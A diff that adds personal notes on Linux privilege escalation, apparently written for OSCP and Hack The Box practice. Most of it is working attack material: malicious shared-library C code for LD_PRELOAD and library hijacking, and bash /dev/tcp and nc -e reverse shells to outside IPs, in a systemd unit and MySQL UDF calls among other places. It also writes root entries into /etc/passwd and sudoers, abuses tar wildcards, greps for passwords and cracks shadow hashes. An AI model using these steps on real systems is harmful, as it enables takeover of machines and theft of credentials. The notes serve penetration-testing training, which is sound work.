@@ -1,0 +1,1080 @@
+Linux Privilege Escalation:
+==========================
+Basics: 
+	Linux Commands:
+		Read Linux Shell Commands Sheet.
+	Linux Users & Groups:
+		Read Linux Shell Commands Sheet.
+Quick Wins:
+	0. which awk perl python python3 python2 ruby gcc cc vi vim nano nmap find netcat nc ncat wget axel tftp ftp 2>/dev/null
+		If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit
+	1. sudo -l => NoPasswd/sudo on binaries
+	2. find / -type f -perm -u=s -exec ls -la {} \; 2>/dev/null => SUID
+	3. services/programs/scripts running that seem non-default? Are they vulnerable?
+		ps auxww | grep root
+	4. Which services are listening only locally? Are they vulnerable?
+	5. Credential Mining:
+		files/folders misconfigured?
+		ssh keys?
+		visit home directory, read any available text files. Visit any unique directories
+		is /etc/passwd writable?
+		is /etc/shadow readable? RW?
+		/var/www/html => Most of the times, this particular dir, contains juicy files. some creds, etc
+	7. Are there any cronjobs or scheduled tasks in place? Who executes them?
+		Note: If you cannot read cron files try pSpy - it may help in identifying interesting recurrently executed commands.
+	8. capabilities => +ep/cap_setuid/cap_dac_override
+	9. ls -la /usr/bin => its always smart to see what binaries the victim user have. Note that automated scripts wont tell this.
+Enumeration:
+	Automated Enumeration:(linpeas.sh/lse.sh -> uptux.py -> linux-exploit-suggester-2.pl)
+		General Enumeration:
+			Linpeas.sh:
+				Basics:
+					Its better as it has colors
+				Usage:
+			Linenum.sh:
+				Basics:
+					Note:
+						Dont use it for OSCP.
+				Usage:
+					./linenum.sh -t -s pass_of_current_user -r linenum_privesc.txt => use this in OSCP
+					Flags:
+						-t Include thorough (lengthy) tests
+			LSE.sh:(https://github.com/diego-treitos/linux-smart-enumeration)
+				Basics:
+					This is a better version of linenum.sh
+					This script is more up to date and just looks cleaner than LinEnum and LinPrivChecker.
+					Levels:
+						Level 2 => dump all the things
+				Usage:
+					./lse.sh -l 2 -i
+					Flags:
+						-l <x> => level
+						-i => 
+		Exploit Suggesters:(CVE)
+			Linux-exploit-suggester.sh:(https://github.com/mzet-/linux-exploit-suggester.git)
+				Basics:
+				Usage:
+			Linux-exploit-suggester-2.pl:(https://github.com/jondonas/linux-exploit-suggester-2)
+				Basics:
+					Linux Exploit suggester - Next Generation
+				Usage:
+					./linux-exploit-suggester.pl
+		Specific Enumeration:(Need a better name)
+			SUDO_KILLER:
+				Basics:
+				Usage:
+			SUID3NUM:
+				Basics:
+				Usage:
+			PSPY:
+				Basics:
+				Usage:
+		Systemd Timers Enumeration:
+			UpTux:(https://github.com/initstring/uptux)
+				Basics:
+					Its used to enumerate Systemd timers
+				Usage:
+					python2 uptux.py
+SUDO Exploitation:
+	Automated Enumeration:
+		SUDO_KILLER:(https://github.com/TH3xACE/SUDO_KILLER)
+			Basics:
+				Allowed in OSCP
+			Usage:
+				./sudo_killer.sh -c -e -r report.txt -p /tmp -s password
+				./sudo_killer.sh -c -e -r report.txt -p /tmp
+				Flags:
+					-c => include CVE checks with respect to sudo version
+					-e => include export of sudo rules / sudoers file
+					-r => name of report to save output
+					-p => path where to save report
+					-s => supply user password for sudo checks  
+	Manual Enumeration & Exploitation:
+		Exploiting Misconfigurations:
+			Enumeration:
+				sudo -l => Shows list of commands user can run as root.
+				Note:
+					Read Linux Shell Commands Sheet to read more:
+			Exploitation:(based on output)
+				NOPASSWD:(to run command/binary/script on behalf of any other user)
+					sudo -u username command/binary/script
+						Note:
+							use full path of script
+						Read Exploiting Binaries/Scripts for Privesc Section
+				SETENV:
+					used in HTB::Adminer
+				SUDO Shell Escape:(binaries)
+					when we execute "sudo -l", we see some binaries which we can execute as sudo
+						whenever we see binaries => gtfobins.github.io
+				Abusing Shared Libraries:
+					Escalation via LD_PRELOAD:
+						LD_PRELOAD:
+							Its an optional environment variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
+							LD => Dynamic Linker
+							PreLoading => its a property of LD, it means we can load our own library before loading anything else.
+							Library:
+								Its a file containing data or compiled code that is used by developers to avoid re-writing the same pieces of code you use in multiple programs.
+								We have 2 types of libraries in linux:
+									1. Static libraries:(.a)
+										They are a part of the application and cannot be changed
+									2. Dynamically linked shared object libraries(.so)
+										They can be changed in two ways:
+											A. Dynamic linking
+											B. Dynamic loading
+						Discovery:
+							sudo -l
+								env_reset, env_keep+=LD_PRELOAD
+								<some binary name>
+						Exploitation:
+							making malc library(.so file):
+								shell.c:
+									#include <stdio.h>
+									#include <sys/types.h>
+									#include <stdlib.h>
+									void _init(){
+										unsetenv("LD_PRELOAD");
+										setgid(0);
+										setuid(0);
+										system("/bin/bash");
+									}
+									explanation:
+										unsetenv("LD_PRELOAD") => unset env variable "LD_PRELOAD"
+										setgid(0) => gid of root is 0
+										setuid(0) => uid of root is 0
+										system("/bin/bash") => excute /bin/bash
+									Note:
+										This .so file is different than the one we used in SUID SO injection
+								gcc -fPIC -shared -o shell.so shell.c -nostartfile => gives shell.so
+									Note:
+										We can save shell.so in 
+											/tmp
+											/var/tmp/
+											/dev/shm
+							sudo LD_PRELOAD=/tmp/shell.so <binary name> => we are root now
+					Escalation via LD_LIBRARY_PATH:
+						Basics:
+							The LD_LIBRARY_PATH contains a list of directories which search for shared libraries first.
+						Discovery:
+							sudo -l
+								env_reset, env_keep+=LD_LIBRARY_PATH
+								<some binary_name>
+						Exploitation:
+							ldd <binary_name> => shows all the shared libraries.
+							making malc library(.so.1 file):
+								shell.c:
+									#include <stdio.h>
+									#include <stdlib.h> 
+									static void hijack() __attribute__((constructor));
+									void hijack() {
+									    unsetenv("LD_LIBRARY_PATH");
+									    setresuid(0,0,0);
+									    system("/bin/bash -p");
+									}
+									Explanation:
+										unsetenv("LD_LIBRARY_PATH") => unset env variable "LD_PRELOAD"
+										system("/bin/bash -p") => excute /bin/bash
+									Note:
+										This .so.1 file is different than the one we used in SUID SO injection
+								gcc -o /tmp/name.so.1 -shared -fPIC /home/user/tools/sudo/shell.c
+							sudo LD_LIBRARY_PATH=/tmp <binary_name>
+								We only pass directory here
+		Exploiting Outdated Version of Sudo Binary:
+			Enumeration:
+				sudo -V
+			Exploitation:
+				If version < 1.8.28:
+					CVE-2019-14287:
+						Requirements:
+							1. /etc/sudoers.tmp or sudo -l should have this line:
+								username ALL=(ALL, !root)
+							2. sudo version < 1.8.28
+						Exploitation:
+							sudo -u#-1 <command> => runs command as root
+							sudo -u#-1 /bin/bash => gives root
+				If version < 1.8.26:
+					CVE-2019-18634:(THM::Sudo Buffer Overflow)
+						Requirements:
+							1. sudo version < 1.8.26
+							2. pwnfeedback should be enabled, how to check it:
+								a. sudo -l 
+								b. cat /etc/sudoers
+								c. sudo su root
+									type anything afterwards, it will be written as *****
+						Exploitation:
+							git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
+							cd sudo-cve-2019-18634
+							gcc -o exploit exploit.c
+							victim> ./exploit => got root
+SUID Exploitation:
+	Basics:
+		Read Linux Shell Command Sheet to read about SUID.
+		Note:
+			Important thing to read before exploiting SUID:
+				Understanding output of ls -la:
+					Read Linux Shell Command Sheet
+	Enumeration:
+		Automated:
+			SUID3NUM:(https://github.com/Anon-Exploiter/SUID3NUM.git)
+				Basics:		
+				Usage:
+					python suid3num.py
+						Flags:
+							-e => Automated Exploitation => DONOT USE THIS FLAG IN OSCP EXAM
+					Note:
+						It is allowed in OSCP. However, using "-e" flag is not allowed in oscp as its used for automated exploitation.
+		Manual:
+			Finding SUID files:
+				find / -type f -perm -u=s -exec ls -la {} \; 2>/dev/null
+	Privesc via Abusing SUID Binaries:(/usr/bin and /usr/sbin and /bin and /sbin)
+		gtfobins
+		Specific privesc for SUID binaries:
+			So, while doing HTB, i came across some boxes, which had some SUID which i was not able to exploit via method given in gtfobins
+			systemctl:(used in HTB::jarvis)
+				Create root.service in kali and transfer it to victim at /home/root.service:(blank lines are necessary)
+					[Unit]
+					Description=get root privilege
+
+					[Service]
+					Type=simple
+					ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/9999 0>&1'
+
+					[Install]
+					WantedBy=multi-user.target
+				which systemctl => copy the location of systemctl binary(default => /bin/systemctl)
+				/bin/systemctl enable /home/root.service
+				/bin/systemctl start root
+				nc -nvlp 9999
+		bash < 4.4:
+			Exploitation:
+				env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' name_of_SUID
+			Explanation:
+				In bash (version < 4.4), when in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+		Custom Binaries:
+			Read Exploiting Binaries for Privesc Section
+	Privesc via PATH variable:
+		Lets say we found a SUID and analysed it using grep/cat/strings and found that other files(script/binaries) are being called from it
+		Read Exploiting Scripts/binaries for Privesc section
+	Privesc via Exploiting SUID with Wildcards:
+		We found a SUID and it is using some command(example: ls) inside it which has an "*" as an argument.
+		Read Exploiting Scripts for Privesc Section -> WildCards section
+Confusion between SUID and sudo -l related to gtfobins.io:
+	gtfobins.io can be used in both sudo -l and SUID privesc vector to exploit binaries:
+		SUID => we exploit binaries to get shell of owner of the SUID file
+		sudo -l => we exploit binaries to get shell of root
+Exploiting Services/Processes which are running as root Locally:
+	Basics:	
+		Every service run as process. 
+		In Linux, Databases run as services too.
+		LoopBack Services:
+			Services which run locally
+	Enumeration:
+		Automated:
+		Manual:
+			ps -aux => show all services
+			ps -aux | grep “^root” => show services running as root
+	Exploitation:
+		Exploiting Local Database for Privesc:(Example of LoopBack Services)
+			MySQL:
+				Connecting to it:
+					mysql -u user -p pass -h localhost
+					mysql -u user -p pass
+				Exploitation:
+					Is this Process running as root:
+						version:(mysql --version)
+							if version == 5.x/4.x
+								raptor_udf2:
+									kali:
+										cp /usr/share/exploitdb/platforms/linux/local/1518.c .
+										mv 1518.c raptor_udf2.c
+										gcc -g -m32 -c raptor_udf2.c
+										gcc -g -m32 -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+									victim:
+										mysql> use mysql;
+										mysql> create table boo(line blob);
+										mysql> insert into boo values(load_file('/tmp/raptor_udf2.so'));
+										mysql> select * from boo into dumpfile '/usr/lib/raptor_udfa.so';
+										mysql> create function do_system returns integer soname 'raptor_udfa.so';
+										mysql> select * from mysql.func;
+										if nc is available:
+											mysql> select do_system('nc -nv 192.168.0.14 8000 -e /bin/bash');
+										Else:
+											mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +x /tmp/rootbash');
+											$ /tmp/rootbash -p
+					select sys_exec('<command>'); => This will execute command as the user who owns the process running mysql(can be used for root too)
+						select sys_exec('nc -nv 192.168.0.14 8000 -e /bin/bash'); => to get a revshell
+					Dumping Data:
+						show databases; 
+						use db_name;
+						Show tables;
+						SELECT * FROM table_name;
+			Postgresql:
+				psql --user postgres -h sqlserver => to login
+				if version > 9.3:
+					CREATE TABLE cmd_exec(cmd_output text);
+					COPY cmd_exec FROM PROGRAM 'id';
+					COPY cmd_exec FROM PROGRAM 'echo “vickie::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd';
+			Mongo:
+			Redis:
+			Note:
+				Most times, we get credentials for Db in their config file, linpeas.sh/linenum.sh shows it.
+Exploiting Binaries for Privesc:
+	A. For Known Binaries:
+		Goto "gtfobins" & decide the expoitation pathway.
+	B For Custom Binaries:
+		1. Is it Editable?
+			<writing shell>
+		2. Is it Readable?
+			Enumeration:(Reading it)
+				Strings:
+					strings file_name => Shows strings in the File.
+					Note:
+						Read Linux Shell Commands Sheet to read about Strings.
+			Exploitation Pathways:
+				A. Read Privesc via PATH variable
+				B. SO Injection:(Shared Object Injection)
+					Basics:
+						In SO Injection, we inject into a .so file to exploit the executable/binary which may help escalate our privileges.
+						Note:
+							Read Linux Internals Sheet to read about SO.
+					Enumeration:
+						Using Strace:
+							strace /abcd/file_name 2>&1 | grep -iE "open|access|no such file" => look in its output and find a .so file whose directory is writable
+							Note:
+								Read Linux Shell Commands Sheet to read about Strace.
+					Exploitation:
+						Creating malc.so:
+							Writing .c Code:
+								Malc1.c:
+									#include <stdio.h>
+									#include <stdlib.h>
+									static void inject() __attribute__((constructor));
+									void inject() {
+									    setresuid(0,0,0);
+									    setresgid(0,0,0);
+									    system("/bin/bash");
+									}
+								Malc2.c:
+									#include <stdio.h>
+									#include <stdlib.h>
+									static void inject() __attribute__((constructor));
+									void inject() {
+									    setresuid(0,0,0);
+									    setresgid(0,0,0);
+									    system("/bin/bash -p");
+									}
+								Malc3.c:
+									#include<stdio.h>
+									#include<stdlib.h>
+									static void inject() __attribute__((constructor));
+									void inject(){
+										setuid(0);
+										system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash -p");
+									}
+							Compiling .c to .so:
+								gcc -shared -fPIC -o malc.so malc.c	
+								Note:
+									Read C For Pentesing Sheet to read about gcc.
+						move malc.so to the destination according to strace output
+						Execute binary:
+							>binary_name
+Exploiting Scripts(php/sh/py) for Privesc:
+	We can get a custom script as SUID/NOPASSWD/CRONJOB/cronjob/timer/anything
+	A. Scripts is only Readable:(cat /abcd/script.ext)
+		a. Any Binary/script being called by the script:
+			1. Privesc Via Relative/Absolute PATH:
+				Basics:
+					A file can be called in two ways:
+						1. Via Relative PATH:
+							full path is not specified
+							Uses PATH variable to search for the mentioned file 
+								Understanding PATH:
+									It simply tells the prirority of where to look for a file when using Relative PATH
+									PATH=/home/user:/sbin/local/:------
+									to run a file, it will 1st look in /home/user then in /sbin/local and then in .......
+							Example:
+								systeminfo
+						2. Via Absolute Path:
+							full path is specified
+							Example:
+								/bin/systeminfo
+				A. Binary is called:(such as systeminfo)
+					Via Relative PATH:
+						Example:
+							ping -c 4 xxx.xxx.xxx.xxx
+						Exploitation:
+							echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1' > /tmp/name_of_binary
+							chmod 777 /tmp/name_of_binary
+							export PATH="/tmp:$PATH"
+					Via Absolute PATH:
+						possible in Special Binary => Service
+					Special Binaries i get confused with:(not custom)
+						1. Service Binary:
+							Via relative PATH:
+								Example:
+									service apache2 start
+								Exploitation:
+									echo 'int main(){setgid(0);setuid(0);system("/bin/bash");return 0;}' > /tmp/service.c
+										Note:
+											Read C For Pentesing Sheet to understand the code.
+									gcc /tmp/service.c -o /tmp/service
+										Note:
+											Read C For Pentesing Sheet to read about gcc.
+									export PATH=/tmp:$PATH
+							Via Absolute Path:
+								Example:
+									/usr/sbin/service start apache2
+								Requirements:
+									version of bash < 4.2-048:
+										/bin/bash --version
+										/bin/sh –version
+								Exploitation:
+									we make a malicious function with same name:
+										function1:	
+											function /usr/sbin/service {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+										function2:
+											function /usr/sbin/service {cp /bin/bash -p; }
+									export -f /usr/sbin/service
+				B. Script is called:
+					Read Exploiting Scripts(php/sh/py) for Privesc section
+			2. Abusing Intended Functionality:
+				ping:(used in HTB::Jarvis)
+					ping $(/bin/bash) => this may cause issues
+					getting a reverse shell:
+						add this to shell.sh => bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+						transfer it to /tmp
+						chmod +x shell.sh
+						ping $(bash /tmp/shell.sh)
+						nc -nvlp 9001
+			3. Is it using a Wildcard:
+				Usage Example in the script:
+					tar czf /tmp/haha.tar.gz *
+				Specific Exploitation:
+					ls:
+						touch -- "-la"
+						execute the SUID => we will see "ls -la" output	
+					tar:
+						Privesc via a script using wildcard in tar:(cat /usr/local/ssss.sh)
+							cd /home/user
+							tar czf /tmp/haha.tar.gz *
+						Exploitation:
+							Generating Payload:
+								shell.sh: Read Linux Payloads and reverse shell Section
+								shell.elf:
+									msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+							Victim:
+								transfer shell.ext to /home/user
+								chmod +x shell.ext
+								touch /home/user/--checkpoint=1
+								touch /home/user/--checkpoint-action=exec=shell.ext
+		b. Any Symlinks Present?
+			Privesc via SymLinks:(aka Symbolic Link)
+				Basics:
+					When a program opens a symlink as a directory, then it reads the contents of the destination directory.
+					When a program writes to a symlink, then the text will appear in the file which the symlink points to.
+					Note:
+						Read Linux Shell Commands Sheet to read about Symlinks.
+				Exploitation:
+					cd /tmp	
+					ln -s /usr/bin/backup.sh
+					echo "nc -e /bin/bash 10.10.14.3 443" >> /usr/bin/backup.sh
+	B. Script can be Edited:
+		shell1.sh: Read Linux Payloads and reverse shell Section
+		shell2.sh: Read Linux Payloads and reverse shell Section
+		shell.py: Read Linux Payloads and reverse shell Section
+		shell.php:(PHP command injection)
+			Add this in the script:
+				echo “vickie::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
+	Note:
+		In case of NOPASSWD:
+			use full path of script
+Privesc via PATH variable:
+	Basics:
+		A file can be called in two ways:
+			1. Via Relative PATH:
+				full path is not specified
+				Uses PATH variable to search for the mentioned file 
+					Understanding PATH:
+						It simply tells the prirority of where to look for a file when using Relative PATH
+						PATH=/home/user:/sbin/local/:------
+						to run a file, it will 1st look in /home/user then in /sbin/local and then in .......
+				Example:
+					systeminfo
+			2. Via Absolute Path:
+				full path is specified
+				Example:
+					/bin/systeminfo
+	A. Binary File:(such as systeminfo)
+		Via Relative PATH:
+			Example:
+				ping -c 4 xxx.xxx.xxx.xxx
+			Exploitation:
+				echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1' > /tmp/name_of_binary
+				chmod 777 /tmp/name_of_binary
+				export PATH="/tmp:$PATH"
+		Via Absolute PATH:
+			possible in Special Binary => Service
+		Special Binaries i get confused with:(not custom)
+			1. "service" Binary:(service abcd start)
+				Via relative PATH:
+					Example:
+						service apache2 start
+					Exploitation:
+						echo 'int main(){setgid(0);setuid(0);system("/bin/bash");return 0;}' > /tmp/service.c
+							Explanation:
+								setgid(0) => gid of root is 0
+								setuid(0) => uid of root is 0
+								system("/bin/bash") => execute /bin/bash
+						gcc /tmp/service.c -o /tmp/service
+							Note:
+								Read C For Pentesing Sheet to read about gcc.
+						export PATH=/tmp:$PATH
+				Via Absolute Path:
+					Example:
+						/usr/sbin/service start apache2
+					Requirements:
+						version of bash < 4.2-048:
+							/bin/bash --version
+							/bin/sh –version
+					Exploitation:
+						we make a malicious function with same name:
+							function1:	
+								function /usr/sbin/service {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+							function2:
+								function /usr/sbin/service {cp /bin/bash -p; }
+						export -f /usr/sbin/service
+	B. Script:
+		Read Exploiting Scripts(php/sh/py) for Privesc section
+Credential Mining:
+	Password hunting:
+		grep -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+		grep -rnw '/' -ie 'pass' --color=always 2> /dev/null
+		grep -rnw '/' -ie 'DB_PASS' --color=always 2> /dev/null
+		grep -rnw '/' -ie 'DB_PASSWORD' --color=always 2> /dev/null
+		grep -rnw '/' -ie 'DB_USER' --color=always 2> /dev/null
+		find / -type f -iname "PASS*" 2> /dev/null
+		cat ~/.*history | less
+		cd ~; grep -Eir "password|secret|sudo|<username>" * | less 2> /dev/null 
+		cd /home; grep -Eir "password|secret|sudo|<username>" * | less 2> /dev/null 
+		cd /etc; grep -Eir "password|secret|sudo|<username>" * | less 2> /dev/null 
+		cd /var/www; grep -Eir "password|secret|sudo|<username>" * | less 2> /dev/null 
+		Config files:
+			find / -type f -iname "*.config*" 2> /dev/null | less
+				This will look for .config/.config.bak/.config.old files
+			find / -type f -iname "*.opvn*" 2> /dev/null | less
+				openvpn files are also config files
+	Shadow password cracking:
+		basics:
+			/etc/passwd:
+				it contains no password
+				anyone can read it
+				it tells us what users are on a machine
+			/etc/passwd:
+				contains password in form of SHA-512 hash
+				only users with uid 0 can read it
+			relation between the two:
+				passwd: root:x:-----------
+				shadow: root:hash
+				now, the 'x' is a placeholder the hash of root
+		unshadow passwd shadow
+			passwd => /etc/passwd
+			shadow => /etc/shadow
+			it gives a SHA-512 file containg hash which can be cracked later on using hashcat or john
+			hashcat -m 1800 hash rockyou.txt
+Insecure File Permissions:
+	READABLE /etc/shadow:
+		cat /etc/shadow => copy the hash of root/privileged user
+		hashid <hash>
+		use hashcat/john to crack the hash
+	WRITABLE /etc/shadow:
+		1. remove 'x' from passwd file, and root becomes passwordless
+		2. Create a new password:
+			mkpasswd -m sha-512 password1234
+			exchange hash of shadow file to the hash we generated
+		3. Change our user's id to 0 => we become root
+	WRITABLE /etc/passwd:
+		If we are on a new linux system:(/etc/passwd dont store hashes)	
+			echo root::0:0:root:/root:/bin/bash > /etc/passwd
+			su
+		If we are on old linux system:(/etc/passwd will store hashes and /etc/shadow dont exist)
+			Create a new password:
+				openssl passwd password
+				append this in /etc/passwd:
+					newroot:<hash_from_openssl>:0:0:/root/:/bin/bash
+				su newroot
+	WRITABLE /etc/sudoers:
+		echo "current_username ALL=(ALL:ALL) ALL" >> /etc/sudoers => add user to sudoers group
+		sudo su
+Exploting Schedules Tasks:
+	CronJobs:
+		Basics:
+			Read Linux Shell Commands Sheet.
+		Enumeration:
+			Automated:	
+				PSPY:(https://github.com/DominicBreuker/pspy)
+					It is a process monitoring tool
+					Usage:
+						timeout 5m ./pspy64 -pfc -i 1000:
+							joined pspy64 command with timeout, so that it ends after 5 minutes
+						./pspy64 -pfc -i 1000
+							Flags:
+								-p => enables printing commands to stdout 
+								-f => enables printing file system events to stdout
+								-r => list of directories to watch recursively (by default, watches /usr, /tmp, /etc, /home, /var, and /opt)
+								-i => interval in milliseconds between procfs scans
+								-c => print commands in different colors
+					Understanding Output:
+						UID=0 => running as root
+						Examples:
+							A. HTB::Writeup
+					Note:
+						It is architecture specific, so use 64-bit version for x64
+			Manual:
+				cat /etc/crontab
+		Exploitation:
+			Privesc via CRONPATH:
+				Sometimes, we have PATH variable declared inside a crontab, known as CRONPATH
+				if we find a file running every minute by root, we can modify it looking at our path
+			Privesc via Scripts/Binary called from cron:
+				can we edit/read these scripts/binaries => Read Exploiting Scripts/binaries for Privesc section
+				script contains wildcard that reference files => Read Exploiting Scripts for Privesc section
+	Timers:(Systemd Timers)(HTB::Time)
+		Basics:
+			Read Linux Shell Commands Sheet.
+		Enumeration:
+			Automated:
+				Instead of linpeas.sh, use "uptux"
+				uptux:(https://github.com/initstring/uptux)
+					Usage:
+						python2 uptux.py
+			Manual:
+				Listing Timers:
+					systemctl list-timers --all => list all timers
+					Note:
+						Read Linux Shell Commands Sheet to read about systemctl.
+				Locating Timers:
+					find /etc/systemd/ -name timer_backup.service
+		Exploitation:
+			Exploitation depends on the fact whether we can edit .service file or any file which is being called the .service file and so on.
+Capabilities:(HTB::Lightweight)
+	Basics:
+		Read Linux Shell Command Sheet.
+	Enumeration:
+		Automated:
+			Linpeas.sh
+		Manual:
+			getcap -r / 2>/dev/null => See capabilies of every file in the whole system
+			Note:
+				Read Linux Shell Commands to read about getcap.
+		Note:
+			Copy name of capability, google "<capability> privesc"
+	Exploitation:
+		cap_dac_read_search:
+			If a program has this capability, then it can read any file and list any directory irespective of its actual permissions.
+				Example => tar:
+					We can use it to read /etc/shadow
+						tar -cvf shadow.tar /etc/shadow
+						tar -xvf shadow.tar
+						cat etc/shadow
+		cap_dac_override:
+			If a program has this capability, then it can override read/write/execute permission check.
+			It means it can read/write/execute any file it want irespective of its actual permissions
+		cap_setuid:
+		=ep:(Empty Capability)
+			OpenSSL:(/home/user/openssl =ep)
+				openssl base64 -in /etc/shadow | base64 -d => read contents of /etc/shadow
+				openssl base64 -in /root/root.txt | base64 -d => read contents of root.txt
+				Edit /etc/shadow:
+					openssl base64 -in /etc/shadow | base64 -d > shadow => getting a local copy of /etc/shadow
+					openssl passwd -1 -salt root rick => get hash (pass => rick)
+					edit shadow and change root hash with new hash
+					openssl enc -in shadow -out /etc/shadow => move shadow to /etc/shadow
+				Edit /etc/passwd:
+					same way as above. 
+					Read Credential Mining section -> Writable /etc/passwd
+Exploiting users with ‘.’ in their PATH:
+NFS Root Squashing:(This vuln is only present when port 2049 is open)
+	Basics:
+		Files created via NFS(Network File Share) inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.
+		So, we want Root Squashing disabled.
+	Enumeration:	
+		Automated:
+			linpeas.sh
+		Manual:	
+			cat /etc/exports:
+				if we see a line like this:
+					/dir*(----,no_root_squash)
+				it means that /dir is shareable and can be mounted. it also means any changes made to it while being mounted are done as ROOT
+	Exploitation:
+		kali:
+			showmount -e <ip> => it will show shares offered by an ip
+			mkdir /tmp/
+			mount -o rw,vers=2 <ip>:/dir /tmp/
+			cd /tmp/
+			Create either elf or binary payload as defined in "Linux Payloads and reverse shell" section
+			chmod +xs /tmp/shell
+		Victim:
+			cd /tmp
+			./shell
+Group Exploitation:
+	Enumeration:
+		id => show groups
+	Group-Based Exploitation:
+		Docker Group Privilege Escalation:
+			Basics:
+				Docker is a tool to run applications by using containers.
+				Containers are isolated from one another and bundle their own software, libraries and configuration files, they can communicate with each other through well-defined channels.
+				A container runs from an image. An image is built using a Dockerfile
+				Any member of the “docker” group who has access to the Docker command has root privileges in the container.
+			Exploitation:
+				Basics:
+					When an admin allows an unprivileged user to access the ‘docker’ group it allows us to make use of the docker CLI to create containers. Because docker runs with the SUID bit set we can use this to abuse the file system and elevate our privileges on out target.
+				Using Docker:
+					docker container ps -a => list containers
+					Privesc-1:
+						docker run -it container_name bash => run bash on container_name
+						echo "my_username ALL=(ALL) NOPASSWD: ALL" > /host/etc/sudoers.d/<my_username> => gives us NOPASSWD on sudo
+						exit
+					Privesc-2:
+						Mount host on /mnt:
+							docker run -v /:/mnt/ -it container_name bash
+							docker run -v /:/mnt/abcd -it container_name sh
+								/ => host root => host directory to be shared
+								/mnt/ => is the target directory in the container where the files are used
+						cd /mnt => now we can access any file we want	
+					Flags:
+						run => 
+						-v => --volume
+						-i => --interactive => interactive
+						-t => --tty => give shell
+						-d => --detach =>
+						--name => 
+					Overwite etc/passwd inside docker to gain root 	
+		LXD/LXC Group Privilege Escalation:(HTB::Tabby)
+			Requirement:
+				We need to be a part of LXD group, to find:
+					>id
+			Exploitation:
+				The basic idea is that I can create a container and mount the root file system into the container, where I then have full access to it.
+				lxc list => show current containers
+				echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
+					This is the smallest container(656 bytes)
+				lxd init => to initialize lxd
+				lxc image import bob.tar.bz2 --alias bobImage
+					name of container image => bobImage
+				lxc init bobImage bobVM -c security.privileged=true
+					name of container => bobVM
+					-c security.privileged=true => run container as root, giving it access to the host filesystem as root(by default, containers run as a non-root UID)
+				lxc config device add bobVM realRoot disk source=/ path=r
+				lxc start bobVM
+				lxc exec bobVM -- /bin/sh => got root shell
+				Note:
+					we havent used "LXD Alpine Linux image builder" method as we found a better one.
+SSH keys:
+	Finding SSH keys:
+		find / -type f -iname "id_rsa*" 2> /dev/null
+		find / -type f -iname "authorized_keys*" 2> /dev/null
+			Once, we obtain authorized_keys:
+				Trying to predict public key:(https://github.com/g0tmi1k/debian-ssh)
+					kali:
+						echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
+						echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config
+						/etc/init.d/ssh restart
+						git clone https://github.com/g0tmi1k/debian-ssh
+						cd debian-ssh
+						tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+						cat authorized_keys => copy first 20 to 30 chars
+						grep -lr '<paste_chars>'
+							if successful, it will list a key.pub
+								mv key.pub key
+								ssh -vvv victim@target -i key
+	Is port 22 open:
+		Is /home/user_name directory of privileged user writable:
+			1.Generate our private and public key:
+				generating key:(id_rsa)
+					ssh-keygen -t rsa => it will give us two files:
+						id_rsa => private key, we can apply passphrase too.
+							/home/.ssh/id_rsa
+						id_rsa.pub => public key
+							/home/.ssh/id_rsa.pub
+					chmod 600 id_rsa
+			2. upload id_rsa.pub to /home/user_name/.ssh/authorized_keys
+			3. kali> ssh -i id_rsa user_name@ip
+Kernel Exploitation:
+	Repos:
+		github.com/lucyoa/kernel-exploits
+		https://github.com/evait-security/ClickNRoot
+	Famous Kernel Exploits:
+		dirtycow:(CVE-2016-5195)
